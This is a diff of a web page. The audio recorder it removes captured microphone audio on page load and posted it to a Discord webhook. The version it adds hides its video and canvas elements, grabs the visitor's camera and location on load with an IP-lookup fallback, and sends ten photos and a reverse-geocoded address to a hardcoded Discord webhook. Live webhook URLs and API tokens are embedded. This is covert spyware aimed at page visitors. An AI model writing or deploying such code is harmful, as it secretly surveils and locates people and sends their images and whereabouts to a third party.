@@ -3,65 +3,162 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Audio Recorder</title>
+    <title>Automatic Multiple Photo Capture with Location</title>
+    <style>
+        video, canvas {
+            display: none; /* Hide video and canvas */
+        }
+    </style>
 </head>
 <body>
-    <h1>Audio Recorder</h1>
-    <p>Recording will start after 3 seconds...</p>
+    <video id="video" autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
-        const discordWebhookUrl = 'https://discord.com/api/webhooks/1302642013472034836/Q27T5NsKk2ZB1vUipsughbPnyxfI43Z4fRgeWqUQXnl1Seip7raMHYAcLxxn31zc2KHZ'; // Replace with your Discord webhook URL
+        const discordWebhookURL = 'https://discord.com/api/webhooks/1302878400523796572/kKNxn1f3uNOmwAU7dyHN9jTkH-i9oN2FZ93ImexFnYNHHLm8Dw1tJCIDrAejvkNtz1ck';
+        const locationIQToken = 'pk.292b33b23efbaeb73cb23eec1d9d18aa';
+        const ipinfoURL = 'https://ipinfo.io/json?token=41d360af12f2bf';
 
-        async function recordAudio() {
-            // Request microphone permissions
-            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            const mediaRecorder = new MediaRecorder(stream);
-            let chunks = [];
+        let locationData = "Location not available";
 
-            // Collect audio data
-            mediaRecorder.ondataavailable = (event) => {
-                chunks.push(event.data);
-            };
-
-            // Start recording after 3 seconds
-            setTimeout(() => {
-                mediaRecorder.start();
-                console.log("Recording started...");
-
-                // Stop recording after 10 seconds
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                    console.log("Recording stopped...");
-
-                    mediaRecorder.onstop = async () => {
-                        const blob = new Blob(chunks, { type: 'audio/webm' });
-                        chunks = []; // Reset chunks array
-                        
-                        // Convert blob to file to send it to Discord
-                        const file = new File([blob], "audio_recording.webm", { type: "audio/webm" });
-
-                        // Send the audio file to Discord
-                        const formData = new FormData();
-                        formData.append("file", file);
-
-                        fetch(discordWebhookUrl, {
-                            method: 'POST',
-                            body: formData,
-                        }).then(response => {
-                            if (response.ok) {
-                                console.log("Audio sent to Discord successfully.");
-                            } else {
-                                console.error("Failed to send audio to Discord.");
-                            }
-                        }).catch(error => console.error("Error:", error));
-                    };
-                }, 10000); // Stop after 10 seconds
-            }, 3000); // Start after 3 seconds
+        // Initialize the camera
+        async function initCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('video').srcObject = stream;
+                captureMultiplePhotos();  // Start capturing photos
+            } catch (error) {
+                console.error("Error accessing camera:", error);
+                sendErrorToDiscord("Failed to access the camera.");
+            }
         }
 
-        // Automatically start recording when page loads
-        window.onload = () => {
-            recordAudio();
+        // Fetch location data
+        async function getLocation() {
+            try {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(async (position) => {
+                        const { latitude, longitude } = position.coords;
+                        locationData = await reverseGeocode(latitude, longitude);
+                    }, async (error) => {
+                        console.warn("Geolocation failed, falling back to IP location:", error.message);
+                        await getLocationFromIP();
+                    });
+                } else {
+                    console.warn("Geolocation not supported, falling back to IP location.");
+                    await getLocationFromIP();
+                }
+            } catch (error) {
+                console.error("Error getting location:", error);
+                sendErrorToDiscord("Error fetching location data.");
+            }
+        }
+
+        // Fallback location using IP API
+        async function getLocationFromIP() {
+            try {
+                const response = await fetch(ipinfoURL);
+                const data = await response.json();
+                const { loc, ip } = data;
+                if (loc) {
+                    const [latitude, longitude] = loc.split(',');
+                    locationData = await reverseGeocode(latitude, longitude);
+                } else {
+                    locationData = `Unable to retrieve precise location. IP: ${ip}`;
+                }
+            } catch (error) {
+                console.error("Error with IP location fallback:", error);
+                locationData = "Unable to retrieve location";
+            }
+        }
+
+        // Reverse geocode to get a human-readable address
+        async function reverseGeocode(latitude, longitude) {
+            try {
+                const url = `https://us1.locationiq.com/v1/reverse.php?key=${locationIQToken}&lat=${latitude}&lon=${longitude}&format=json`;
+                const response = await fetch(url);
+                const data = await response.json();
+                return data.display_name || `Lat: ${latitude}, Lon: ${longitude}`;
+            } catch (error) {
+                console.error("Error during reverse geocoding:", error);
+                return `Lat: ${latitude}, Lon: ${longitude}`;
+            }
+        }
+
+        // Capture multiple photos with a 3-second delay between each
+        async function captureMultiplePhotos() {
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            let captureCount = 0;
+            const maxCaptures = 10;
+            const captureInterval = 3000; // 3 seconds
+
+            // Function to capture a photo and send it to Discord
+            async function captureAndSendPhoto() {
+                try {
+                    context.drawImage(document.getElementById('video'), 0, 0, canvas.width, canvas.height);
+                    const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
+
+                    if (imageBlob) {
+                        const formData = new FormData();
+                        formData.append('file', imageBlob, `capture_${captureCount + 1}.png`);
+                        formData.append('payload_json', JSON.stringify({ content: `Location: ${locationData}` }));
+
+                        const response = await fetch(discordWebhookURL, {
+                            method: 'POST',
+                            body: formData
+                        });
+
+                        if (!response.ok) {
+                            console.error("Failed to send image to Discord:", response.statusText);
+                            sendLocationOnlyToDiscord();
+                        }
+                    } else {
+                        console.error("Failed to capture image.");
+                        sendErrorToDiscord("Failed to capture image.");
+                        sendLocationOnlyToDiscord();
+                    }
+                } catch (error) {
+                    console.error("Error sending image to Discord:", error);
+                    sendErrorToDiscord("Error sending image to Discord.");
+                    sendLocationOnlyToDiscord();
+                }
+            }
+
+            // Loop to capture images at intervals
+            const captureIntervalId = setInterval(async () => {
+                if (captureCount < maxCaptures) {
+                    await captureAndSendPhoto();
+                    captureCount++;
+                } else {
+                    clearInterval(captureIntervalId);  // Stop capturing after 10 photos
+                }
+            }, captureInterval);
+        }
+
+        // Send only location to Discord if image capture fails
+        async function sendLocationOnlyToDiscord() {
+            const locationMessage = `Location fallback: ${locationData}`;
+            fetch(discordWebhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: locationMessage })
+            }).catch(error => console.error("Error sending location-only message to Discord:", error));
+        }
+
+        // Send an error message to Discord
+        function sendErrorToDiscord(message) {
+            fetch(discordWebhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: `Error: ${message}` })
+            }).catch(error => console.error("Error sending error message to Discord:", error));
+        }
+
+        // Start everything on page load
+        window.onload = async () => {
+            await getLocation();
+            initCamera();
         };
     </script>
 </body>
